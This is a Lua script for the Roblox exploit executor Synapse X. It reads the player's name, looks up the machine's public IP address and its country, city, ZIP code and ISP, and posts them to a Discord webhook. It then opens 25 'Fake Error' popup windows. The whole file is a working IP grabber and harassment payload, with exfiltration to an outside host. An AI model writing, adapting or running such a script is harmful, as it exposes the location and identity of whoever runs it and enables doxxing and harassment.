local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local name = Players.LocalPlayer.Name

-- 🔗 Insert your Discord webhook URL here
local WebhookURL = "https://discord.com/api/webhooks/your_webhook_here"

-- 🌐 Get your IP address
local getIPResponse = syn.request({
    Url = "https://api.ipify.org/?format=json",
    Method = "GET"
})
local GetIPJSON = HttpService:JSONDecode(getIPResponse.Body)
local IPBuffer = tostring(GetIPJSON.ip)

-- 🛰️ Get IP Location Info
local getIPInfo = syn.request({
    Url = "http://ip-api.com/json/" .. IPBuffer,
    Method = "GET"
})
local IIT = HttpService:JSONDecode(getIPInfo.Body)

-- 📦 Data Format
local dataMessage = string.format([[
🧍 User: %s
🌐 IP: %s
🏳 Country: %s (%s)
📍 Region: %s, %s
🏙 City: %s (%s)
🛰 ISP: %s
🏢 Org: %s
]], name, IPBuffer, IIT.country, IIT.countryCode, IIT.region, IIT.regionName, IIT.city, IIT.zip, IIT.isp, IIT.org)

-- 📬 Send to Discord webhook
syn.request({
    Url = WebhookURL,
    Method = "POST",
    Headers = {
        ["Content-Type"] = "application/json"
    },
    Body = HttpService:JSONEncode({
        content = dataMessage
    })
})

-- 💬 Spam Popups (requires FFI, works in Synapse X)
local ffi = require("ffi")
ffi.cdef[[
    int MessageBoxA(void* hWnd, const char* lpText, const char* lpCaption, unsigned int uType);
]]

local popupText = "Hello from " .. name .. "! 😈"
local popupTitle = "Fake Error"
for i = 1, 25 do
    spawn(function()
        ffi.C.MessageBoxA(nil, popupText, popupTitle, 0)
    end)
end
